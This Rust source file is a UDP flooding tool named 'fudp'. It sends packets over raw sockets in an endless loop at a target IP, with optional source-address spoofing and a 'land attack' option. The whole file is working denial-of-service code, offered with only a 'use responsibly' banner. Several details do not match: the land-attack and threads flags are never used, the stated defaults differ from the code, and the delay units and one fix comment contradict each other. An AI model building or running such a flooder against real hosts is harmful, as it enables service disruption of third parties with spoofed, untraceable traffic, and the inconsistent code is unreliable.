extern crate pnet;
extern crate rand;
extern crate spin_sleep;

use clap::{Arg, ArgAction, Command};
use pnet::packet;
use pnet::packet::Packet;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::transport;
use rand::{Rng, RngCore};
use std::net::{IpAddr, Ipv4Addr};
use std::str::FromStr;

fn main() {
    let matches = Command::new("fudp")
        .before_help("Please use responsibly")
        .version(env!("CARGO_PKG_VERSION"))
        .author("xorrsprsp - https://github.com/xorrsprsp/")
        .about("fudp is a simple and very easy to use UDP flooding utility")
        .arg(
            Arg::new("dst-ip")
                .help("The IP to be targeted")
                .required(true)
                .index(1),
        )
        .arg(
            Arg::new("single-packet")
                .short('1')
                .help("Sends a single datagram and then exits")
                .action(ArgAction::SetTrue),
        )
        .arg(
            Arg::new("random-src")
                .short('r')
                .help("Spoofs a random sender IP")
                .action(ArgAction::SetTrue),
        )
        .arg(
            Arg::new("threads")
                .short('i')
                .help("Spin up extra threads generating datagrams")
                .value_name("THREADS")
                .num_args(1),
        )
        .arg(
            Arg::new("dst-port")
                .short('p')
                .help("Destination port")
                .value_name("PORT")
                .num_args(1),
        )
        .arg(
            Arg::new("payload-size")
                .short('z')
                .help("UDP payload size (Default: 0; Empty packets)")
                .value_name("SIZE")
                .num_args(1),
        )
        .arg(
            Arg::new("src-ip")
                .short('s')
                .help("Spoofs a specified source IP")
                .value_name("IP")
                .num_args(1),
        )
        .arg(
            Arg::new("delay")
                .short('d')
                .help("Sleeps the thread for the specified time in μs before sending a new packet (Default: 0μs)")
                .value_name("MICROSECONDS")
                .num_args(1),
        )
        .arg(
            Arg::new("land-attack")
                .short('l')
                .help("Land Attack")
                .action(ArgAction::SetTrue),
        )
        .arg(
            Arg::new("precompute-random-IPs")
                .short('c')
                .help("Precompute a number of random IPs (Default: 4'000'000 IPs)")
                .value_name("IPs")
                .num_args(1)
        )
        .get_matches();

    let dst_ip = matches.get_one::<String>("dst-ip").unwrap();

    let src_ip = match matches.get_one::<String>("src-ip") {
        Some(source_ip) => match Ipv4Addr::from_str(source_ip) {
            Ok(ip) => ip,
            Err(err) => {
                println!("Error: {}", err);
                std::process::exit(1);
            }
        },
        None => Ipv4Addr::new(0, 0, 0, 0),
    };

    let mut dst_port = match matches.get_one::<String>("dst-port") {
        Some(destination_port) => match destination_port.parse::<u16>() {
            Ok(port) => port,
            Err(err) => {
                println!("Error while interpreting port: {}", err);
                std::process::exit(1);
            }
        },
        None => 0u16,
    };

    let payload_size = match matches.get_one::<String>("payload-size") {
        Some(size) => match size.parse::<u16>() {
            Ok(size) => size,
            Err(err) => {
                println!("Error while setting datagram size: {}", err);
                std::process::exit(1);
            }
        },
        None => 0,
    };

    let random_src = matches.get_flag("random-src");
    let single_packet = matches.get_flag("single-packet");

    let dst_ip = match Ipv4Addr::from_str(dst_ip) {
        Ok(ip) => ip,
        Err(err) => {
            println!("Error: {}", err);
            std::process::exit(1);
        }
    };

    // Fix: check if the delay option is present using contains_id instead of get_flag
    let delay_enabled = matches.contains_id("delay");
    let delay = match matches.get_one::<String>("delay") {
        Some(delay) => match delay.parse::<u64>() {
            Ok(delay) => delay,
            Err(err) => {
                println!("Error while setting delay: {}", err);
                std::process::exit(1);
            }
        },
        None => 0,
    };

    let delay_micro = delay * 1000;

    if !src_ip.is_unspecified() && random_src {
        eprintln!("ERROR: -s and -r flags are mutually exclusive");
        std::process::exit(1);
    }

    let (mut tx, _rx) = match transport::transport_channel(
        1000,
        transport::TransportChannelType::Layer3(IpNextHeaderProtocols::Udp),
    ) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => panic!("{}", e),
    };

    // Fix: Use thread_rng instead of rng
    let mut rng = rand::rng();

    // Before the main loop
    let ip_addresses = match matches.get_one::<String>("precompute-random-IPs") {
        None => 1_000_000,
        Some(ip_addresses) => match ip_addresses.parse::<usize>() {
            Ok(ip_addresses) => ip_addresses,
            Err(err) => {
                println!("Error while setting precomputed random bytes: {}", err);
                std::process::exit(1);
            }
        },
    };

    let mut random_bytes = vec![0u8; ip_addresses * 4]; // 4 bytes per IPv4 address
    rng.fill_bytes(&mut random_bytes);

    // Generate a random u16 for source port
    let random_src_port = rng.random::<u16>();

    // Fix: check for dst-port using contains_id instead of get_flag
    if !matches.contains_id("dst-port") {
        // Generate a random u16 for destination port
        let random_dst_port = rng.random::<u16>();
        dst_port = random_dst_port;
    }

    let udp_struct = packet::udp::Udp {
        source: random_src_port,
        destination: dst_port,
        length: 8 + payload_size, // at least 8, to hold all header data without a payload
        checksum: 0,
        payload: vec![0u8; payload_size as usize],
    };

    let mut udp_buffer = vec![0u8; 8 + payload_size as usize];
    let udp_buffer_len = udp_buffer.len() as u16;
    let mut udp_packet = packet::udp::MutableUdpPacket::new(&mut udp_buffer).unwrap();

    udp_packet.populate(&udp_struct);

    let ipv4_struct = packet::ipv4::Ipv4 {
        version: 4,
        header_length: 5, // 5 is the minimum amount of 32 bit words the IPv4 header can consist of, a larger number than 5 will enable the IPv4 options header
        dscp: 0,
        ecn: 0,
        total_length: 20 + udp_buffer_len, // 20 is the minimum amount of bytes an IPv4 packet can be (header only)
        identification: 0,
        flags: 0,
        fragment_offset: 0,
        ttl: 60,
        next_level_protocol: IpNextHeaderProtocols::Udp,
        checksum: 0,
        source: src_ip,
        destination: dst_ip,
        options: vec![],
        payload: vec![0u8; udp_buffer_len as usize],
    };

    let mut ipv4_buffer = vec![0u8; 20 + udp_buffer_len as usize];

    let mut ipv4_packet = packet::ipv4::MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();

    ipv4_packet.populate(&ipv4_struct);
    println!("{:?}", ipv4_packet);
    ipv4_packet.set_payload(udp_packet.packet());

    let spin_sleeper = spin_sleep::SpinSleeper::new(100_000_000);
    let mut batch_index: usize = 0;
    if single_packet {
        send_packets(
            &mut tx,
            dst_ip,
            random_src,
            &mut ipv4_packet,
            batch_index,
            &mut random_bytes,
        );
        return;
    }
    
    loop {
        send_packets(
            &mut tx,
            dst_ip,
            random_src,
            &mut ipv4_packet,
            batch_index,
            &mut random_bytes,
        );
        batch_index = (batch_index + 1) % ip_addresses;
        if batch_index == 0 {
            rng.fill_bytes(&mut random_bytes);
        }
        if delay_enabled {
            spin_sleeper.sleep_ns(delay_micro);
        }
    }
}

fn send_packets(
    tx: &mut pnet::transport::TransportSender,
    dst_ip: Ipv4Addr,
    random_src: bool,
    ipv4_packet: &mut pnet::packet::ipv4::MutableIpv4Packet,
    batch_index: usize,
    random_bytes: &mut Vec<u8>,
) {
    if random_src {
        // Generate random IP octets
        let idx = batch_index * 4;
        let random_ipv4_addr = Ipv4Addr::new(
            random_bytes[idx],
            random_bytes[idx + 1],
            random_bytes[idx + 2],
            random_bytes[idx + 3],
        );
        ipv4_packet.set_source(random_ipv4_addr);
    }

    let _result = tx.send_to(&*ipv4_packet, IpAddr::V4(dst_ip));
}
